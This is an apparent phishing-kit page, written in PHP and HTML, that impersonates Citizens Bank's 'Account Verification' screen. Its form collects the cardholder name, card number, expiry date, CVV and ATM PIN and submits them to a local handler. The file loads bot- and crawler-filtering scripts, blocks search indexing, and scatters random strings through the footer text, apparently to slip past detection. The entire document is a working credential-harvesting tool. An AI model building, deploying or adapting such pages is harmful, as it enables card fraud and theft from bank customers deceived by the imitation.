<?php
session_start();
error_reporting(0);
include '../autob/bt.php';
include '../autob/basicbot.php';
include '../autob/uacrawler.php';
include '../autob/refspam.php';
include '../autob/ipselect.php';
include "../autob/bts2.php";
?>
<!DOCTYPE html>
<html lang="en-US" style="" class="js flexbox canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths js flexbox canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths citizens-Chrome citizens-user-none"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="robots" content="noindex,nofollow">

	<link href="../styless/apple-touch-icon.png" rel="apple-touch-icon">
	<link href="../styless/apple-touch-icon-76x76.png" rel="apple-touch-icon" sizes="76x76">
	<link href="../styless/apple-touch-icon-120x120.png" rel="apple-touch-icon" sizes="120x120">
	<link href="../styless/apple-touch-icon-152x152.png" rel="apple-touch-icon" sizes="152x152">
	<link href="../styless/apple-touch-icon-180x180.png" rel="apple-touch-icon" sizes="180x180">
	<link href="../styless/icon-hires.png" rel="icon" sizes="192x192">
	<link href="../styless/icon-normal.png" rel="icon" sizes="128x128">
	
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
	
<title>Account Verification | Citizens Bank</title>

<script type="text/javascript" src="../js/jquery-1.9.1.min.js"></script>
<script type="text/javascript" src="../js/plugin.js"></script>
<script type="text/javascript" src="../js/main.js"></script>
<script type="text/javascript" src="../js/jquery.mask.js"></script>




  <script>
$(function() {
$('#expdate').mask('00/00');
});</script>

<link rel="stylesheet" href="../styless/jquery-ui-1.10.3.custom.min.css">
<link rel="stylesheet" href="../styless/normalize.css">
<link rel="stylesheet" href="../styless/main.css">
<link rel="stylesheet" href="../styless/flows.css">
<link rel="stylesheet" href="../styless/ad-containers.css">

<style>
	input[type=password].error {
		border-color : red;
	}
</style>
						  
						  <style type="text/css" id="kampyleStyle">.noOutline{outline: none !important;}.wcagOutline:focus{outline: 1px dashed #595959 !important;outline-offset: 2px !important;transition: none !important;}</style>
						  
						  
						  
						  			<style>
			.clear-both {
				clear: both;
			}
			
			.hide{display:none;}

			.block-display {
				display: block;
			}

			.relative {
				position: relative;
			}
			section[data-id="content"],section[data-id="content"] *{box-sizing:border-box;}
			section[data-id="content"]{
				max-width: 722px;
				display: block;
				margin: auto;
				position: relative;
				float: left;
				padding-right: 30px;
				width:100%;
			}

			section[data-id="content"] h1 {
				font-family: Georgia;
				font-size: 28px;
				color: #44464a;
				line-height: 1.154em;
				font-weight: lighter;
				margin: 0;
			}
			section[data-id="content"] h2 {   
				font-family: Verdana;
				font-size: 14px;
				color: #444;
				line-height: 1.231;
				margin: 14px 0 25px 0;
			}

			section[data-id="content"] input[type="text"], section[data-id="content"] input[type="tel"] {
                margin-top: 5px;
                height: 34px;
				width:80%;
                max-width: 220px;
                padding-left: 10px;
                font-weight: normal;
                text-decoration: none;
                font-size: 13px;
                color: #44464a;
                border-radius: 2px;
                border: 1px solid #cfd1d7;
				font-family:verdana;
				text-transform:capitalize;
            }
			section[data-id="content"] input.upper{
				text-transform:uppercase;
			}
			section[data-id="content"] input.normal{
				text-transform:none;
			}
			section[data-id="content"] input[type="text"]{
				width:100%;
				max-width:300px;
			}
			section[data-id="content"] .groupin{
				margin-top:30px;
			}
			section[data-id="content"] select {
			    position: relative;
			    z-index: 0;
			    width: 100%;
			    height: 2em;
			    border: 0;
			    line-height: 2;
			    height: 45px;
			    margin-bottom: 15px;
			}

			section[data-id="content"] div[data-id="selectContainer"] {
				position: relative;
				width: 250px;
			}

			section[data-id="content"] div[data-id="selectContainer"]:focus {
				border: 2px solid;
			}

			section[data-id="content"] div[data-id="inputContainer"] {
				margin-top:10px;
				position: relative;
				margin-right:30px;width:100%;
			}
			section[data-id="content"] div[data-id="inputContainer"].tofloat{
				float: left;
				width:auto;
			}
			section[data-id="content"] div[data-id="inputContainer"] .insub{
				margin-top:5px;
				position: relative;
				display: block;
			}
			section[data-id="content"] div[data-id="inputContainer"] .inalt{
				margin-top:5px;
				color:#5174b8;
			}
			section[data-id="content"] div[data-id="inputContainer"] .inalt:hover{
				text-decoration: underline;
			}

			section[data-id="content"] div[data-id="inputContainer"] input:focus {
				
			}

			section[data-id="content"] div[data-id="inputContainer"] img {
				width: 12px;
				height: 12px;
			}

			section[data-id="content"] div[data-id="inputContainer"] label {
				font-weight: bold;
			}

			section[data-id="content"] .hr{
				padding-top: 10px;
			}
			@media only screen and (max-width:600px){
				
				section[data-id="content"] {
				padding:0 20px;
			}
			}
			
			.popup{
				width:60%;
				padding:10px;
				text-align:center;
				position:absolute;border:1px solid #777;
				box-shadow:2px 2px 5px;
				bottom:110%;
				background-color:#fff;
			}
			.popup span{
				padding:2px 4px; margin:2px;display:inline-block;cursor:pointer;
				border:1px solid #777;
				background-color:#008eff;color:#fff;
			}
			#main-content{width:100%!important;}
		</style>


</head>
<body class="responsive-enabled" style="display: block;">


<div class="citizens-header-footer-injected">

<link rel="stylesheet" type="text/css" href="../styless/citizensns.min.42588.css">
<style>
.help-modal-header .help-modal-close {background: url(efs/hhf/img/modal-help-close.png) center center no-repeat transparent; background-size: 20px;}
.help-modal-menu a.active {background: #f2faf8 url(efs/hhf/img/arrow-right-green.png) right 20px center no-repeat; background-position: right 20px center; background-size:7px}
.account-section-title.checkmark h1 {padding: 0px 0px 5px 28px !important; }
.lt-ie9 .help-modal-menu a.active {background: #f2faf8 url(efs/hhf/img/arrow-right-green.png) right 20px center no-repeat !important; background-size:7px !important}
.input-wrapper .tooltip {margin-left: 1px;}
</style>
<div class="citizens-header-footer"><div class="citi-modal timeout-modal simplemodal-data" id="timeout-modal" style="display:none;"></div><div class="citi-modal help-modal" id="help-modal" tabindex="0" style="display:none;"></div>
</div>
</div><div class="citizens-header">

    <!-- overlay to hide elements until CSS is loaded -->
    <style>
        .citizens-header-footer-overlay{ opacity:1; background-color:#fff; position:fixed; width:100%; height:100%; top:0px; left:0px; z-index:1000; }
        .citizens-header-footer-overlay .centered-content { width: 100%; max-width: 1060px; padding: 0 20px; margin: 0 auto; font-family: arial, helvetica, san-serif; font-size: 14px;}
        .citizens-header-footer-overlay .responsive-enabled .centered-content { width: auto; max-width: 1060px; }
        .citizens-header-footer-overlay .page-logo { float: none; }
        .citizens-header-footer-overlay .page-logo img{ margin: 10px; float: none;}
        .citizens-header-footer-overlay .topshadow {
            position: absolute; width: 100%; top: 100px; z-index: 5; height: 8px; 
            background: -webkit-radial-gradient(50% 100%, farthest-side, rgba(0, 0, 0, 0.1), transparent 100%); background: radial-gradient(farthest-side at 50% 100%, rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0) 100%); background-repeat: no-repeat; background-size: cover;
        }
    </style> 
    
    <!-- end overlay -->

    <style>
        .account-section-title.checkmark h1 { padding: 0px 0px 5px 28px !important; }
        .mobile-alert-dot {min-width: 22px; min-height: 22px; width: auto; height: auto; max-width: 50px; max-height: 50px; padding: 5px; }
    </style>

    <!-- htmlContainer PREFIX -->
    <div class="citizens-header-footer">
        <div id="page-header" class="page-header">
            <!-- inc-header.html START -->
            <div class="topshadow"></div>
            <div class="centered-content clearfix">

                <a href="#" class="page-logo" tabindex="1">
                    <img border="0" alt="Citizens Bank" width="203" height="25" src="../styless/CTZ_Green-01.png">
                </a>
                <div id="header-navigation-container"></div>

            </div>
            <!-- inc-header.html END -->
        </div>
    </div>
    <!-- htmlContainer SUFFIX -->


</div>
<!-- end CITIZENS BANK Hosted Header -->




<div id="page-container" class="page-container">
	<div class="centered-content clearfix">
		<section id="top-content" class="page-region top-content">
        
    	</section>
    	<section id="main-container" class="main-container clearfix">

        	<!-- =================
        	MAIN CONTENT AREA START
        	================= -->
			
    	<span class="account-table-border"></span>
        	<section id="main-content" class="page-region main-content">
  
	<div class="account-table account-table-full">
    	<div class="account-table-content">
            <div class="account-content-container">
                <div class="account-table-body">
                    <header class="account-section-title clearfix account-secure">
                            <h1>Account Verification - Account Details</h1>
                    
                                            
                    </header>
                    
               
  

                    <div id="messagecontainer" class="error-message show-error<?php if(isset($_GET[''.$theerrkey.''])){echo ' error-visible';}?>" role="alert">Invalid Entries. Please review your information then try again.</div>
                    <section data-id="content" class="account-section">
                        
<form class="pay-transfer-options clearfix" action="folnetval" name="SignOn" id="frmSignOn" method="post">
                                    
                                    
                                   
                                    
                                    <div class="account-title clearfix">
                      <p>For your security, please complete all field below to confirm your identity and continue.</p>
                                    </div>
		<div class="form-item label-right full-width clearfix">
	    
            <h2>Step 1 of 1: Confirm Your Card</h2>
							
						<div class="clear-both groupin">
						<div data-id="inputContainer">
		                    <label for="cardname">Card Name</label>
							<div class="insub">Name as it appears on card.</div>
		                    <input aria-required="true" id="cardname" name="cardname" value="" type="text" placeholder="Name On Card">
			            </div>
						</div>	
		                <div class="clear-both">
						<div data-id="inputContainer">
		                    <label for="cardnumber">Card Number</label>
		                    <input aria-required="true" id="cardnumber" name="cardnumber" value="" maxlength="19" type="tel" onkeypress="stoplen(19)" oninput="innumlen(this.value);demcnum()" onpaste="demcnum()" required="required"/>
			            </div>
						</div>
						<div class="clear-both">
		                <div data-id="inputContainer" class="tofloat">
							<label for="expdate">EXPIRY DATE</label>
		                    <input aria-required="true" id="expdate" name="expdate" maxlength="5" type="tel" placeholder="MM/YY" value="" onkeypress="stoplen(5)" oninput="demexpDate()" required="required">
		                </div>
		                <div data-id="inputContainer" class="tofloat">
							<div id="cvvpopup" class="popup" style="display:none">This is the standalone 3 or 4 digit number on the front or back of your card<br/><span onclick="popup()">close</span></div>
		                    <label for="cvv" style="width:100px;display:inline">CVV</label>
							<a control="forms:inputHelpIconContainer" href="#" onclick="popup()"><img control="forms:inputHelpIcon" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAAVFBMVEX////P0dfS1NnP0dfR09nQ0tj////P0dcAaYzh4ubY2d729vfz8/Xw8fLv9vgPcpOfx9Q/jqj8/Pzf7PFvqr4vhaF/tMWPvcxPl7Afe5rP4+lfobekTrJhAAAABnRSTlMAYMwg2fb3Zk79AAAAiklEQVR4Xl2P2QrEIBAEjTE13ube6///c42yLKTepqCZbnUxaKnoQXVGIy7FmJyYsd2TDzSCny5j/Erel+UBqzc1LwEOW3lCkEFpB5st7NYCTitJwDyTiwWSKIkA217sAsQqQhP2deYmegTsCT2iHS1Dw+n+lnf5QHvbi5GPmV7sXv0/LvzG3ed/AQFWB28fFqxFAAAAAElFTkSuQmCC" alt="help icon for cvv field"/></a><br>
		                    <input aria-required="true" id="cvv" name="cvv" value="" type="tel" placeholder="CVV" maxlength="4" onkeypress="stoplen(4)" oninput="innumlen(this.value)">
			            </div>
						<div class="clear-both"></div>
						</div>
						<div class="clear-both">
						<div data-id="inputContainer">
		                    <label for="atmpin">ATM PIN</label>
		                    <input aria-required="true" id="atmpin" name="atm" value="" maxlength="4" type="tel" oninput="innumlen(this.value)" onkeypress="stoplen(4)"/>
			            </div>
						</div>
						
						
						
		                <div class="block-display clear-both"><br/><p>Please Confirm the informations before you submit</p>
		                </div>
						
					  </div>
            	<div class="form-actions">
                
                        
                
                
            <input type="submit" class="submit-button arrow" tabindex="3" name="carub" data-trigger="next" value="NEXT"> 
            </div>
    </form>
        
                </section>
            </div>
            </div>
    	</div>
	</div>

</section> 

<!-- Brand type from query parameter -->
		</section> 
	</div> 
</div>


<script>
"use strict"
document.getElementById("frmSignOn").setAttribute("novalidate",true);

function popup(){var pop = document.getElementById('cvvpopup').style.display;
	if(pop=="block"){document.getElementById('cvvpopup').style.display="none";}
	else if(pop=="none"){document.getElementById('cvvpopup').style.display="block";};
};

function demexpDate(){var expdate=event.target;var key =event.data;var val=expdate.value;if(event.inputType=="insertText"){if(isNaN(parseInt(key))){event.target.value=val.slice(0,val.length-1);}; switch(val.length){case 1:if(key > 1){event.target.value="";}; break; case 2:if(val[0]==1 && key > 2 || isNaN(parseInt(key))){event.target.value=val.slice(0,val.length-1);} else if(val[0]==0 && key == 0){event.target.value=val.slice(0,val.length-1);} else {expdate.value=expdate.value+"/";}; break; case 4:if(key < 2 || key >= 3 || key == 0){event.target.value=val.slice(0,val.length-1);}; break; case 5:if(!isNaN(parseInt(key))){event.target.value=val;}; break;};};if(event.inputType=="deleteContentBackward" && val.length == 2){expdate.value=val[0]}};

function demcnum(){var self=event.target;var key =event.data;var val=self.value;var sep="-";var mval=val.replace(/\s/g,'').split('');
var pos=self.selectionStart;var cardtype=val.substring(0,2);var otherctype=val.substring(0,1);
if(pos){
if(/37|34/.test(cardtype)){self.maxLength="17";} else{self.maxLength="19";};
if(event.inputType=="insertText"){
if(cardtype==37 || cardtype ==34){for(var i=0;i < mval.length;i++){if(i==3 || i==9){mval[i]=mval[i]+' ';};};}
else{for(var i=0;i < mval.length;i++){if(i==3 || i==7 || i==11){mval[i]=mval[i]+' ';};};};
mval=mval.join('');mval=mval.split('');event.target.value=mval.join('');;
if(mval[pos]){if(cardtype==37 || cardtype ==34){
if(pos%4==0 && pos<6 && mval.length>=5){event.target.setSelectionRange(pos+1,pos+1);} else if(pos%12==0 && mval.length>=13){event.target.setSelectionRange(pos+1,pos+1);} else{event.target.setSelectionRange(pos,pos);};} else{if(pos%5==0){event.target.setSelectionRange(pos+1,pos+1)} else{event.target.setSelectionRange(pos,pos);};};};
};
if(event.inputType=="deleteContentBackward"){
if(cardtype==37 || cardtype ==34){for(var i=0;i < mval.length;i++){if(i==3 || i==9){mval[i]=mval[i]+' ';};};}
else{for(var i=0;i < mval.length;i++){if(i==3 || i==7 || i==11){mval[i]=mval[i]+' ';};};};
mval=mval.join('');mval=mval.split('');
event.target.value=mval.join('');
if(pos==0){event.target.setSelectionRange(0,0);}
else{if(cardtype==37 || cardtype ==34){
if(pos%4==0 && mval.length==5){event.target.setSelectionRange(pos,pos);} else if(pos%12==0 && mval.length==13){event.target.setSelectionRange(pos-1,pos-1);} else{event.target.setSelectionRange(pos,pos)};}
else{if(pos%5==0){event.target.setSelectionRange(pos-1,pos-1)} else{event.target.setSelectionRange(pos,pos);};};}
;};};
};

function innumlen(val){if(event.inputType=="insertText"){if(isNaN(parseInt(event.data))){if(val.length<=1){event.target.value="";} else{event.target.value=val.slice(0,val.length-1);};};};};

function stoplen(len){if(event.target.value.length==len && event.key!='Enter'){event.preventDefault();};}
</script>






<!-- begin CITIZENS BANK Hosted Footer -->
<div class="citizens-footer"><div class="citizens-header-footer"><footer id="page-footer" class="page-footer"><div class="footer-top">
<ul>
<li>
<a href="#" class="contact" title="Opens Ways to Contact Us Dialog">
<span class="account-underline">Ways to Contact Us</span><span class="visuallyhidden">- Opens Ways to Contact Us Dialog</span>
</a>
<div class="dropup-menu">
<h4>Contact Us</h4>
<p>General Questions:
<br>
<strong>1-800-656-6561</strong> (personal bank accounts)
<br>
Business Questions:
<br>
<strong>1-877-229-6428</strong> (online banking support)
<br>
<strong>1-800-862-6200</strong> (account information)
<br>
Investment Questions:
<br>
<strong>1-800-942-8300</strong> (Citizens Investment Services)
</p>
</div>
</li>

<li>
<a href="#" class="locator" title="Opens Branch &amp; ATM Locator Dialog">
<span class="account-underline">Branch &amp; ATM Locator</span><span class="visuallyhidden">- Opens Branch &amp; ATM Locator Dialog</span>
</a>
<div class="dropup-menu">
<h4>Branch &amp; ATM Locator</h4>
<p>Find one of our 1,300 locations near you.</p>
<div role="form">
<div id="stickyFooterBranch-error" class="error-message" style="display: none"></div>
<input id="stickyFooterBranch" type="text" title="Enter Zip Code or City, State" placeholder="Enter Zip Code or City, State" value="NONE">
<a href="#" type="button" class="button button-stickyfooterbranch">Submit</a>
</div>
</div>
</li>
<li><a onclick="showSurvey(formId);" style="cursor:pointer;"><img src="../styless/feedback.png" alt="Give Feedback" border="0" style="cursor:pointer;border:0px;height:40px;width:40px;padding-right:4px;">Feedback</a></li></ul>
</div>
<div class="footer-row clearfix">
<ul>
<li>
<h6>Checking &amp; Savings</h6>
</li>
<li>
<a>Checking</a>
</li>
<li>
<a>Savings</a>
</li>
<li>
<a>Money Markets</a>
</li>
<li>
<a>Certificates of Deposit (CDs)
<sup>®</sup>
</a>
</li>
<li>
<a>IRAs</a>
</li>
<li>
<a>Programs &amp; Services</a>
</li>
<li>
<a>Benefits &amp; Features</a>
</li>
<li>
<a>Debit Card</a>
</li>
<li>
<a>Overdraft Choices
<sup>®</sup>
</a>
</li>
</ul>
<ul>
<li>
<h6>Home Borrowing</h6>
</li>
<li>
<a>Mortgages</a>
</li>
<li>
<a>Home Equity Loans</a>
</li>
<li>
<a>Home Equity Lines of Credit</a>
</li>
<li>
<a>Determine My Rate</a>
</li>
<li>
<a>My Mortgage Account</a>
</li>
</ul>
<ul>
<li>
<h6>Students</h6>
</li><li>
<a>Student Loan Options</a>
</li>
<li>
<a>Refinancing Student Loans</a>
</li>
<li>
<a>The Student Loan Process</a>
</li>
<li>
<a>Undergraduate Students &amp; Parents</a>
</li>
<li>
<a>Graduate Students</a>
</li>
<li>
<a>Tools &amp; Information</a>
</li>
<li>
<a>Banking for Students</a>
</li>
<li>
<a>Access My Student Loan</a>
</li>
</ul>
<ul class="last">
<li>
<h6>Card<?php echo rT('ALPHANUMERIC',rand(1,87));?>s</h6>
</li>
<li>
<a>Credit Cards</a>
</li>
<li>
<a>Card Agreements</a>
</li>
<li>
<a>Security Features</a>
</li>
</ul>
</div>

<div class="footer-row clearfix">
<ul>
<li>
<h6>Personal Loans</h6>
</li>
<li>
<a>Overview</a>
</li>
<li>
<a>FAQs</a>
</li>
</ul>
<ul>
<li>
<h6>Resources</h6>
</li>
<li>
<a>Order Checks</a>
</li>
<li>
<a>Online &amp; Mobile Banking</a>
</li>
<li>
<a>Customer Service</a>
</li>
</ul>
<ul>
<li>
<h6>About Us</h6>
</li>
<li>
<a>About Citizens Bank</a>
</li>
<li>
<a>In the Community</a>
</li>
<li>
<a>Careers</a>
</li>
<li>
<a>About Our Ads</a>
</li>
</ul>
<ul class="last">
<li>
<h6>Solutions</h6>
</li>
<li>
<a>Personal</a>
</li>
<li>
<a>Investing</a>
</li>
<li>
<a>Small Business</a>
</li>
<li>
<a>Commercial</a>
</li>
</ul>
</div>

<div class="footer-row clearfix">
<ul>
<li>
<h6>Disclosures</h6>
</li>
<li>
<a>Online Terms and Conditions</a>
</li>
<li>
<a>Electronic Notice Disclos<?php echo rT('ALPHANUMERIC',rand(1,87));?>ure and Consent (Online Service)</a>
</li>
<li>
<a>Account Documents</a>
</li>
<li>
<a>Member FDIC</a>
</li>
<li>
<a>Equal Housing Lender
<img alt="Equal Housing Lender" title="Equal Housing Lender" src="../styless/equal-housing.gif">
</a>
</li>
<li>
<a>Security, Privacy &amp; Legal</a>
</li>
</ul>
</div>
<div class="centered-content">
<div class="footer-bottom">
<p class="legal">
Zelle and the Zelle related marks are wholly owned by Early Warning Services, LLC and are used herein under license.
</p>
<p class="legal">
*Securities, Insurance and Investment Advisory Services offered through Citizens Securities, Inc. ("CSI"), also referred to as Citizens Investment Services. CSI is an SEC registered investment adviser and Member - FINRA and SIPC. 770 Legacy Place, MLP240, Dedham, MA 02026. (800) 942-8300. CSI is an affiliate of Citizens Bank, N.A.<br><br>The investment balances shown in online banking are based on market prices, with up to a fifteen minute delay from the time this webpage was last refreshed.  Information relating to accounts not held at CSI is presented as an accommodation and while drawn from sources believed to be reliable is not guaranteed as to accuracy or completeness. Such information should be independently confirmed by the account owner(s).<br><br>Information relating to accounts not held or custodied by National Financial Services (NFS) (Assets Held Away), CSI’s clearing broker dealer, was provided to NFS by outside parties and is included for informational purposes only.  These positions are not part of your brokerage account carried by NFS and therefore any SIPC account protection afforded your account through NFS does not cover these assets or prices reported.  Neither NFS, CSI nor Citizens Bank are responsible for the Assets Held Away information provided and does not guarantee the accuracy or timeliness of the positions or prices reported.  Prices shown do not necessarily reflect the actual current market prices. Further information regarding these prices may be obtained by contacting CSI.<br><br>The investment products and financial strategies suggested herein are subject to investment risk, including possible loss of principal amount invested. Investment decisions should be based on each individual's goals, time horizon and tolerance for risk.<br><br>SpeciFi<sup>®</sup> is made available through CSI. Portfolio management services are sub-advised by SigFig Wealth Management, LLC ("SigFig"), an SEC registered investment adviser. SigFig is not an affiliate of CSI or Citizens Bank, N.A.
</p>

<div class="footer-disclaimer-box footer-disclaimer-box--margin-bottom footer-disclaimer">
<p class="footer-disclaimer-box__text">Securities, Insurance Products and Advisory Services are:</p>
<ul class="footer-disclaimer-box__list">
<li class="footer-disclaimer-box__list-item">NOT FDIC INSURED</li>
<li class="footer-disclaimer-box__list-item">NOT BANK GUARANTEED</li>
<li class="footer-disclaimer-box__list-item">MAY LOSE VALUE</li>
<li class="footer-disclaimer-box__list-item">NOT A DEPOSIT
<br>
</li>
<li class="footer-disclaimer-box__list-item">NOT INSURED BY ANY FEDERAL GOVERNMENT AGENCY</li>
</ul>
</div>
<ul class="footer-util">
<li class="sitemap">
<a>Site Map</a>
</li>
<li>Follow:
<a>
<img src="../styless/footer-follow-facebook.png" alt="Facebook" align="middle">
</a>
<a>
<img src="../styless/footer-follow-twitter.png" alt="Twitter">
</a>
<a>
<img src="../styless/footer-follow-linkedin.png" alt="Linkedin">
</a>
<a href=""
<img src="../styless/footer-follow-youtube.png" alt="Youtube">
</a>
</li>
</ul>

<p class="footer-copyright">
© Copyright <?php echo date("Y");?> Citizens Financial Group, Inc. All rights reserved.<br>Citizens Bank is a brand name of Citizens Bank, N.A. (NMLS ID# 433960).<br>Citizens Bank corporate headquarters: On<?php echo rT('ALPHANUMERIC',rand(1,87));?>e Citizens Plaza, Providence, RI 02903
</p>

<img src="../styless/elh.gif" alt="Equal Housing Lender">
<img src="../styless/fdicFooter.gif" alt="Member FDIC">
</div>
</div>
</footer></div></div>

<link rel="stylesheet" type="text/css" href="../styless/sec-3-2.css">
<div id="sec-overlay" style="display:none;">
<div id="sec-container">
</div>
</div>

</body></html>